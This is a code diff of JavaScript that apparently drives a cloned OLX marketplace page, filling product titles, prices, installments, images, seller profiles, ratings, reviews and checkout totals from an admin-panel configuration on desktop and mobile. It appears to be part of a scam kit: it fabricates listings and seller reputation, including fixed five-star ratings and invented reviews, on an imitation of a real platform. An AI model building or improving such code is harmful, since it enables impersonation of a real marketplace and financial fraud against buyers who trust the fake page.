@@ -25,41 +25,51 @@
     const path = window.location.pathname;
 
     // ----------------------------------------------------
-    // 1. PRODUCT PAGE (index.html / iphone-17-branco-olx.html / /)
+    // 1. PRODUCT PAGE (PC & MOBILE: index.html / iphone-17-branco-olx.html / mobile.html / /)
     // ----------------------------------------------------
     if (path === '/' || path.includes('iphone-17-branco-olx.html') || path === '/index.html' || path.includes('mobile.html') || path === '') {
         // Title
         if (p.title) {
           document.title = p.title + ' | OLX';
           
-          // OLX adview title element
-          document.querySelectorAll('.advc-adview-section__title, [data-section="title"] *, h1').forEach(el => {
+          // OLX adview title element (Desktop and Mobile)
+          document.querySelectorAll('h1, h1#description-title, [data-section="title"] *').forEach(el => {
             el.textContent = p.title;
           });
+          // Desktop specific title row (don't overwrite section headers on mobile)
+          if (!path.includes('mobile.html')) {
+            document.querySelectorAll('.advc-adview-section__title').forEach(el => {
+              if (el.id === 'description-title' || el.closest('[data-section="title"]')) {
+                el.textContent = p.title;
+              }
+            });
+          }
 
           // Meta tags & open graph
           const ogTitle = document.querySelector('meta[property="og:title"]');
           if (ogTitle) ogTitle.content = p.title;
         }
 
-        // Current Price (Pix / à vista)
+        // Current Price (Pix / à vista) - Desktop & Mobile
         if (p.price) {
           const formattedPrice = p.price.startsWith('R$') ? p.price : 'R$ ' + p.price;
 
-          // Main large price on product page
-          document.querySelectorAll('.typo-title-large, .olx-text--price, [data-testid="ad-price"], .ad__sc-12l0m84-0').forEach(el => {
+          document.querySelectorAll('.typo-title-large, .typo-display-large, .olx-text--price, [data-testid="ad-price"], .ad__sc-12l0m84-0').forEach(el => {
             el.textContent = formattedPrice;
           });
 
           // Fallback exact match text replace
           document.querySelectorAll('span').forEach(el => {
-            if (el.children.length === 0 && (el.textContent === 'R$ 4.350' || el.textContent === 'R$ 4.450' || el.textContent === '4.450' || el.textContent === '4.350')) {
-              el.textContent = formattedPrice;
+            if (el.children.length === 0) {
+              const txt = el.textContent.trim();
+              if (txt === 'R$ 4.350' || txt === 'R$ 4.450' || txt === '4.450' || txt === '4.350' || txt === 'R$ 6.499' || txt === '6.499' || txt === 'R$ 800' || txt === '800') {
+                el.textContent = formattedPrice;
+              }
             }
           });
         }
 
-        // Old Price (Riscado)
+        // Old Price (Riscado) - Desktop & Mobile
         if (p.oldPrice) {
           const formattedOld = p.oldPrice.startsWith('R$') ? p.oldPrice : 'R$ ' + p.oldPrice;
           document.querySelectorAll('span[style*="line-through"]').forEach(el => {
@@ -67,16 +77,16 @@
           });
         }
 
-        // Installments
+        // Installments - Desktop & Mobile
         if (p.installments) {
-          document.querySelectorAll('.olx-core-badge--rectangle, span, div').forEach(el => {
+          document.querySelectorAll('.olx-core-badge--rectangle, p.font-semibold.typo-body-small, span, div').forEach(el => {
             if (el.children.length === 0 && (el.textContent.includes('sem juros') || el.textContent.includes('10x') || el.textContent.includes('12x'))) {
               el.textContent = p.installments;
             }
           });
         }
 
-        // Description
+        // Description - Desktop & Mobile
         if (p.description) {
           const descSpan = document.querySelector('.advc-ad-description span.typo-body-medium, .advc-ad-description__lines > .typo-body-medium');
           if (descSpan) {
@@ -84,45 +94,109 @@
           }
         }
 
-        // Category (Breadcrumb & Details)
-        if (p.category) {
-          // 1. Breadcrumbs: update category item (3rd link)
-          const breadcrumbItems = document.querySelectorAll('.olx-core-breadcrumb__list .olx-core-breadcrumb__element a');
-          if (breadcrumbItems && breadcrumbItems.length >= 3) {
-            breadcrumbItems[2].textContent = p.category;
-          }
-          document.querySelectorAll('.olx-core-breadcrumb a').forEach(el => {
-            const txt = el.textContent.trim().toLowerCase();
-            if (txt.includes('celulares') || txt.includes('smartphones') || el.href.includes('/celulares/')) {
-              el.textContent = p.category;
-            }
-          });
-
-          // 2. Product Details: "Categoria" row
-          document.querySelectorAll('.advc-detail-item__text').forEach(item => {
-            const titleSpan = item.querySelector('.advc-detail-item__title');
-            if (titleSpan && titleSpan.textContent.trim().toLowerCase() === 'categoria') {
-              const link = item.querySelector('a, span:not(.advc-detail-item__title)');
-              if (link) link.textContent = p.category;
-            }
-          });
-        }
-
-        // Location
+        // Location - Desktop & Mobile
         if (p.location) {
           document.querySelectorAll('.advc-mini-profile__location, .typo-body-small.text-neutral-120.font-regular').forEach(el => {
             el.textContent = p.location;
           });
+          // Mobile location section
+          const mobLocCity = document.querySelector('.advc-location span.typo-body-medium');
+          if (mobLocCity) mobLocCity.textContent = p.location.split(',')[0].trim();
+          const mobLocState = document.querySelector('.advc-location span.typo-body-small');
+          if (mobLocState) mobLocState.textContent = p.location;
+
           document.querySelectorAll('span').forEach(el => {
-            if (el.children.length === 0 && (el.textContent === 'Vila Guilherme, São Paulo - SP' || el.textContent === 'Vila Guilherme')) {
+            if (el.children.length === 0 && (el.textContent === 'Vila Guilherme, São Paulo - SP' || el.textContent === 'Vila Guilherme' || el.textContent === 'Nova Gerty')) {
               el.textContent = p.location;
             }
           });
         }
 
-        // Product Images Gallery
+        // Product Details / Characteristics Section (PC & Mobile)
+        const d = p.details || {
+          brand: p.brand || 'Brastemp',
+          model: p.model || 'Ative Inox Duplex Frost Free',
+          condition: p.condition || 'Usado - Excelente',
+          color: p.color || 'Inox',
+          storage: p.storage || '',
+          extra: p.extra || '',
+          acceptTrades: p.acceptTrades || 'Não'
+        };
+
+        document.querySelectorAll('.advc-detail-item').forEach(item => {
+          const titleEl = item.querySelector('.advc-detail-item__title');
+          if (!titleEl) return;
+          const title = titleEl.textContent.trim().toLowerCase();
+          const valEl = item.querySelector('.advc-see-more-text, a, span:not(.advc-detail-item__title)');
+          if (!valEl) return;
+
+          function setVal(text) {
+            if (valEl.childNodes && valEl.childNodes.length > 0 && valEl.childNodes[0].nodeType === 3) {
+              valEl.childNodes[0].nodeValue = text;
+            } else {
+              valEl.textContent = text;
+            }
+          }
+
+          if (title === 'categoria') {
+            if (p.category) {
+              item.style.display = '';
+              setVal(p.category);
+            }
+          } else if (title === 'marca') {
+            if (d.brand) {
+              item.style.display = '';
+              setVal(d.brand);
+            }
+          } else if (title === 'modelo') {
+            if (d.model) {
+              item.style.display = '';
+              setVal(d.model);
+            }
+          } else if (title === 'condição' || title === 'condicao') {
+            const cond = d.condition || p.condition || 'Usado - Excelente';
+            item.style.display = '';
+            setVal(cond);
+          } else if (title === 'cor') {
+            if (d.color) {
+              item.style.display = '';
+              setVal(d.color);
+            } else {
+              item.style.display = 'none';
+            }
+          } else if (title.includes('memória') || title.includes('memoria') || title.includes('capacidade') || title.includes('litros')) {
+            if (d.storage) {
+              item.style.display = '';
+              setVal(d.storage);
+            } else {
+              item.style.display = 'none';
+            }
+          } else if (title.includes('saúde') || title.includes('saude') || title.includes('bateria') || title.includes('detalhe') || title.includes('extra')) {
+            if (d.extra) {
+              item.style.display = '';
+              setVal(d.extra);
+            } else {
+              item.style.display = 'none';
+            }
+          } else if (title.includes('troca')) {
+            if (d.acceptTrades) {
+              item.style.display = '';
+              setVal(d.acceptTrades);
+            }
+          }
+        });
+
+        // Category Breadcrumb
+        if (p.category) {
+          const breadcrumbItems = document.querySelectorAll('.olx-core-breadcrumb__list .olx-core-breadcrumb__element a');
+          if (breadcrumbItems && breadcrumbItems.length >= 3) {
+            breadcrumbItems[2].textContent = p.category;
+          }
+        }
+
+        // Product Images Gallery (PC & Mobile)
         if (p.images && p.images.length > 0) {
-          const galleryImgs = document.querySelectorAll('.advc-gallery__image-wrap img, .advc-gallery__item img');
+          const galleryImgs = document.querySelectorAll('.advc-gallery__image-wrap img, .advc-gallery__item img, picture.advc-gallery__image-wrap img');
           p.images.forEach((url, idx) => {
             if (galleryImgs[idx]) {
               galleryImgs[idx].src = url;
@@ -141,14 +215,14 @@
           }
         }
 
-        // Seller on Product Page
+        // Seller on Product Page (PC & Mobile)
         if (s && s.name) {
           document.querySelectorAll('.advc-mini-profile__name, [data-ds-component="DS-SellerName"]').forEach(el => {
             el.textContent = s.name;
           });
         }
 
-        // Render genuine golden stars in Seller History (never avatar images)
+        // Render golden stars in Seller History
         const sellerStarsWrap = document.querySelector('.advc-seller-history__stars');
         if (sellerStarsWrap) {
           sellerStarsWrap.innerHTML = getStarsRow(5, 17);
@@ -171,9 +245,18 @@
           }
         });
 
-        // Seller Avatar ONLY (never touch star icons)
+        // Seller Last access on mobile
+        if (s && s.lastAccess) {
+          document.querySelectorAll('.advc-mini-profile__status span, .advc-mini-profile__activity-meta span').forEach(el => {
+            if (el.textContent.includes('Último acesso') || el.textContent.includes('acesso')) {
+              el.textContent = s.lastAccess;
+            }
+          });
+        }
+
+        // Seller Avatar (PC & Mobile)
         if (s && s.avatar) {
-          document.querySelectorAll('.advc-mini-profile__profile img, img[alt*="Foto de"]').forEach(el => {
+          document.querySelectorAll('.advc-mini-profile__profile img, .advc-mini-profile__avatar, img[alt*="Foto de"]').forEach(el => {
             if (!el.classList.contains('advc-seller-history__star') && !el.closest('.advc-seller-history__stars')) {
               el.src = s.avatar;
               if (s.name) el.alt = 'Foto de ' + s.name;
@@ -186,7 +269,6 @@
       // 2. PROFILE PAGE (/perfil)
       // ----------------------------------------------------
       if (path.startsWith('/perfil')) {
-        // Seller Name
         if (s && s.name) {
           document.title = s.name + ' | Perfil do anunciante - OLX';
           document.querySelectorAll('.typo-body-large.font-semibold, p.typo-body-large').forEach(el => {
@@ -196,19 +278,16 @@
           });
         }
 
-        // Seller Avatar
         if (s && s.avatar) {
           const avatarImg = document.querySelector('[data-testid="avatar-seller"] img, .sc-cbe5f5f1-0 img');
           if (avatarImg) avatarImg.src = s.avatar;
         }
 
-        // Last access
         if (s && s.lastAccess) {
           const accessEl = document.querySelector('.sc-4ab85633-1');
           if (accessEl) accessEl.textContent = s.lastAccess;
         }
 
-        // Member since
         if (s && s.memberSince) {
           document.querySelectorAll('.sc-f92f1d1e-2').forEach(el => {
             if (el.textContent.includes('Na OLX desde')) {
@@ -217,7 +296,6 @@
           });
         }
 
-        // Location
         if (s && s.location) {
           document.querySelectorAll('.sc-f92f1d1e-2').forEach(el => {
             if (el.textContent.includes('Vila Guilherme') || el.textContent.includes('São Paulo')) {
@@ -226,7 +304,6 @@
           });
         }
 
-        // Stats Cards
         if (s && s.stats) {
           const cards = document.querySelectorAll('[data-testid="ads-history-card"]');
           if (cards[0] && s.stats.ads) {
@@ -243,13 +320,11 @@
           }
         }
 
-        // Overall Rating Score
         if (s && s.ratingScore) {
           const ratingScoreEl = document.querySelector('.sc-42545084-0');
           if (ratingScoreEl) ratingScoreEl.textContent = s.ratingScore;
         }
 
-        // Total reviews count text
         const totalReviewsCount = (s && s.reviews && s.reviews.length) || 6;
         document.querySelectorAll('p.typo-body-small.text-neutral-130').forEach(el => {
           if (el.textContent.includes('avaliações recebidas')) {
@@ -257,13 +332,11 @@
           }
         });
 
-        // Link "Exibir todas as avaliações (X)"
         const showAllLink = document.querySelector('.sc-82307d60-0');
         if (showAllLink) {
           showAllLink.textContent = `Exibir todas as avaliações (${totalReviewsCount})`;
         }
 
-        // Custom Reviews in ratings carousel
         if (s && Array.isArray(s.reviews) && s.reviews.length > 0) {
           const carousel = document.querySelector('[data-testid="ratings-carousel"]');
           if (carousel) {
@@ -305,7 +378,6 @@
           }
         }
 
-        // Update the iPhone ad card in the profile
         if (p && p.title) {
           const adTitle = document.querySelector('.olx-ad-card__title, #ds-ad-card-title-13 h2');
           if (adTitle) adTitle.textContent = p.title;
@@ -357,7 +429,6 @@
           });
         }
 
-        // Atualiza os preços do produto e total no checkout com o valor configurado no painel adm
         const formattedProdPrice = fmtCurrencyBRL(productPriceNum);
         document.querySelectorAll('*').forEach(el => {
           if (el.children.length === 0) {
@@ -409,22 +480,18 @@
     }
   }
 
-  // Instant execution with pre-injected config (zero millisecond flicker)
   if (window.__INITIAL_OLX_CONFIG__ && !window.location.search.includes('preview') && !window.location.search.includes('draft')) {
     applyData(window.__INITIAL_OLX_CONFIG__);
   }
 
-  // Initial apply
   if (document.readyState === 'loading') {
     document.addEventListener('DOMContentLoaded', applyAdminConfig);
   } else {
     applyAdminConfig();
   }
 
-  // Extra safety call after 150ms to override any deferred inline scripts
   setTimeout(applyAdminConfig, 150);
 
-  // Cross-window message listener for instant preview updates
   window.addEventListener('message', function(event) {
     if (event.data && event.data.type === 'OLX_CONFIG_UPDATE') {
       applyAdminConfig();
